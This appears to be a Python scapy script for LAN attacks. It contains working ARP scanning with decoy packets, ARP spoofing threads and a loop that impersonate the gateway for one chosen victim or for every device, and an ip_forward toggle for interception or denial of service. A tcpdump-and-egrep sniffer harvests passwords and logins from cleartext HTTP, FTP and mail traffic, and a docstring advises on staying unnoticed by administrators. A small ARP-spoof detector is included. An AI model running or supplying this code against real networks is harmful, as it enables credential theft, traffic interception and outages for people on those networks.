#! /usr/bin/python

from scapy.all import * #Forge packets
import netifaces #Manipulate interfaces
import netaddr   #Manipulate address
import os
import sys
from tools import *
import fcntl, socket, struct
import random
import time;
from threading import * #Use thread for decoy scan



class Decoy(Thread):
    def __init__(self, fakeIp, targetList, interface):
        Thread.__init__(self)
        self.fakeIp = fakeIp
        self.targetList = targetList
        self.interface = interface

    def run(self):
        send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = self.targetList, psrc=self.fakeIp), iface=self.interface, verbose=0)

class Sniffer(Thread):
    def __init__(self, interface, type, output):
        Thread.__init__(self)
        self.interface = interface
        self.output = output
        self.type = type

    def run(self):
        my_mac = getHwAddr(self.interface)
        if self.type == "dns":
            arg = "sudo tshark -i "+self.interface+" -f 'dst port 53 or port 80' -Y 'eth.src!="+my_mac+"' -T ps > "+self.output
            os.system(arg)
        if self.type == "password":
            arg = "sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A -i "+self.interface+"| egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20 > "+self.output
            os.system(arg)
class Spoofer(Thread):
    def __init__(self, gateway_ip, target_ip, my_mac, interface):
        Thread.__init__(self)
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip
        self.my_mac = my_mac
        self.interface = interface
        self.running = True


    def run(self):
        packet = Ether()/ARP(op="who-has",hwsrc=self.my_mac,psrc=self.gateway_ip,pdst=self.target_ip)
        while self.running:
            sendp(packet, verbose=0, iface=self.interface)

    def stop(self):
        self.running = False

class Spoofer_Detector(Thread):
    def __init__(self, output, timeout=100):
        Thread.__init__(self)
        self.timeout = timeout
        self.stop_sniffer = Event()
        self.running = True
        self.no_interrupt=True
        self.my_output = open_file(output,"a")
        if self.my_output == -1 :
            exit()

    def run(self):
        if not recent_file("result/scanNetwork/scan.txt"):
            arp_scan("wlan0")
        while self.running and self.no_interrupt:
            beginning =  time.time()
            my_ip = netifaces.ifaddresses("wlan0")[2][0]['addr']
            my_lfilter = lambda (r): ARP in r and r[ARP].pdst == my_ip
            ans = sniff(filter="arp",
                        prn=None,
                        lfilter=my_lfilter,
                        timeout=self.timeout,
                        iface="wlan0",
                        stop_filter=self.should_stop_sniffer)
            end = beginning + self.timeout
            self.no_interrupt = detect_suspect_arp_request(ans, beginning, end, self.my_output)
            if not self.no_interrupt:
                self.my_output.close()

    def stop(self):
        self.running=False

    def join(self, timeout=None):
        self.running=False
        self.stop_sniffer.set()
        super(Spoofer_Detector,self).join(timeout)

    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()

    def is_running(self):
        return self.running == self.no_interrupt



def getHostname(ip):
    try:
        info = socket.gethostbyaddr(ip)
        hostname = str(info[0])
    except:
        hostname = "Unknown"
    return hostname

def getInfoFromScan(data, separator=" ",my_input="result/scanNetwork/scan.txt"):
    my_file = open_file(my_input,"r")
    if my_file == -1:
        exit()
    for line in my_file:
        if data in line:
            return line.split(" ")
    return ["Unknown","Unknown","Unknown"]

def select_interface():
    all_interfaces = netifaces.interfaces()
    all_interfaces_reversed = reversed(all_interfaces)
    print(colors.CLEAR)
    for interface in all_interfaces_reversed:
        print(colors.HEADER+"Please select an interface in the list:"+colors.ENDC)
        print(str(all_interfaces))
        print(colors.BREVERSE+"--"+interface+"--"+colors.ENDC)
        answer = raw_input()
        print(colors.CLEAR)
        if answer == "y":
            return str(interface)
    #if the user has not made a choice
    return select_interface()

def getHwAddr(ifname):
    """return the mac address of the interface ifname"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    return ':'.join(['%02x' % ord(char) for char in info[18:24]])

def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def get_all_addresses(my_interface):
    ip = netifaces.ifaddresses(my_interface)[2][0]['addr']
    netmask = netifaces.ifaddresses(my_interface)[2][0]['netmask']

    netaddr_ip = netaddr.IPAddress(ip)
    netaddr_netmask = netaddr.IPAddress(netmask)
    netaddr_network = netaddr_ip & netaddr_netmask

    netaddr_full_network = netaddr.IPNetwork(str(netaddr_ip) + '/' + str(netaddr_netmask))
    netaddr_list = netaddr.IPRange(netaddr_network, netaddr_full_network[-2])

    #Create a list sr compatible to avoid to use sr in a loop
    addr_list = []
    for address in netaddr_list:
        addr_list.append(str(address))
    return addr_list

def arp_scan(my_interface, decoy=False, verbosity=0, output="./result/scanNetwork/scan.txt"):
    addr_list = get_all_addresses(my_interface)
    ip_list = []
    if recent_file(output):
        print(colors.OKGREEN+"We found a recent scan. Do you want to use it? y/n"+colors.ENDC)
        answer = raw_input()
        if answer == "y":
            my_file = open(output,"r")
            for lines in my_file:
                ip_list.append(lines.strip("\n"))
            my_file.close()
            return ip_list
    my_file = open(output,"w")
    #-----------------------------ARP scan------------------------------------------
    #Start the ARP scan
    if verbosity > 0:
        print(colors.OKGREEN+"Be patient that can take a while."+colors.ENDC)
    #send a first random decoy scan if u use the option
    if decoy:
        if verbosity > 0:
            print("send a first decoy")
        fake = random.randint(0,len(addr_list))
        thread_1 = Decoy(str(fake), addr_list, my_interface)
        thread_1.start()
        thread_1.join()
        time.sleep(0.2)
    #send&receive packets for the arp scan
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = addr_list), timeout=1, iface=my_interface, verbose=verbosity, retry=2) #retry=2
    #-----------------------------Save the result------------------------------------------
    nb_decoy=3 # limit the number of decoys
    threads_list = []
    for snd, rcv in ans:
        his_ip = rcv.sprintf(r"%Ether.psrc%")
        his_mac = rcv.sprintf(r"%Ether.src%")

        my_file.write(his_ip+" "+his_mac)
        if decoy and nb_decoy > 0:
            my_thread = Decoy(str(his_ip), addr_list, my_interface)
            my_thread.start()
            threads_list.append(my_thread)
            nb_decoy -= 1
        try:
            info = socket.gethostbyaddr(his_ip)
            his_hostname = str(info[0])
            my_file.write(" "+his_hostname+"\n")
            ip_list.append(his_ip+" "+his_mac+" "+his_hostname)
            if verbosity > 0:
                print(his_mac+" - "+his_ip+" - "+his_hostname)
        except:
            print(his_mac+" - "+his_ip)
            my_file.write(" Unknown\n")
            ip_list.append(his_ip+" "+his_mac+" Unknown")
    if verbosity > 0:
        print(colors.OKGREEN+"\nIt's done."+colors.ENDC+" Press a button to quit")
    for current in threads_list:
        current.join()
    my_file.close()
    return ip_list

def preset_arp_spoofing(ip_forward=True):
    """return the gateway in result[0], the target in result[1], the mac address in result[2]
    and the interface in result[3]

    -if ip_forward is false you make an dos attack
    -else you able to see all packets send by the target
    Be carefull if this attack is inconspicuous for a normal user,
    a system administrator can caught you relatively quickly,
    because this generate an irregular traffic on the network.
    """
    print ip_forward
    result = []
    my_interface = select_interface()

    gateway = get_default_gateway_linux()
    if not gateway:
        gateway = select_val(target_list,"Select the gateway:")
    result.append(gateway)

    print(colors.HEADER+"search devices on the network"+colors.ENDC)
    target_list = arp_scan(my_interface)
    print(colors.CLEAR+colors.OKGREEN+"Number of devices : "+str(len(target_list))+colors.ENDC)
    print(colors.OKBLUE+colors.BOLD+"press y to spoof all devices on the network")
    print("press n to spoof only one target on the network"+colors.ENDC)
    answer = raw_input()
    if answer == "n":
    	proper_target_list = [t[0]+" "+t[2] for t in [t.split(" ") for t in target_list]]
        target = select_val(proper_target_list,"Please select a victim:")
        result.append(target)
    else:
        target = target_list
        result.append(target)

    forward = open("/proc/sys/net/ipv4/ip_forward", "w")
    if ip_forward:
        forward.write("1")
    else:
        forward.write("0")
    forward.close()
    my_mac = getHwAddr(my_interface)
    if not my_mac:
        print(colors.FAIL+"Cant get local mac address, quitting"+colors.ENDC)
        sys.exit(1)
    result.append(my_mac)
    result.append(my_interface)
    print result
    return result

def arpSpoofing(gateway_ip, target_ip, my_mac):
    """"Sends requests in a loop as if we were the gateway"""
    packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=gateway_ip,pdst=target_ip)
    while 1:
        sendp(packet, verbose=0)

def detect_suspect_arp_request(ans, beginning, end, my_output):
    result=True
    my_list = []
    for packet in ans:
        for arp in packet:
            my_list.append(str(arp.hwsrc))
    my_set = set(my_list)
    total_time = end - beginning
    for device in my_set:
        nb_pck = str(my_list.count(device))
        if int(nb_pck) > 1:
            #we have only the mac address because the hacker spoof her ip
            #-> we use our scan files to found information about him
            list_info = getInfoFromScan(device)
            his_ip = list_info[0]
            his_hostname = list_info[2].replace("\n","")
            his_mac = device
            if list_info[0]=="Unknown" and not recent_file("result/scanNetwork/scan.txt"):
                arp_scan("wlan0")
                list_info = getInfoFromScan(device)
                his_ip = list_info[0]
                his_hostname = list_info[2]

            if int(nb_pck) < 2:
                print colors.WARNING +  his_hostname + " is suspect" + colors.ENDC
                my_output.write(his_hostname + " may have attacked you\n")

            else:
                result = False
                print colors.FAIL + his_hostname + " attacking you" + colors.ENDC
                my_output.write(his_hostname + " attacked you\n")

            print (time.asctime(time.localtime(end)) + " : " \
                + "\n '->" + his_ip + " : " + his_mac \
                + "\n '->He send " + nb_pck + " packets in " + str(end-beginning) + " seconds\n\n")

            my_output.write(time.asctime(time.localtime(end)) + " " \
                        + "\n '->" + his_ip + " : " + his_mac  \
                        +"\n '->He send " + nb_pck + " packets in " \
                        + str(end-beginning) + " seconds\n\n")

    return result

#dns request
#sudo tshark -i wlan0 -f "src port 53" -n -T fields -e frame.time -e ip.src -e ip.dst -e dns.qry.name
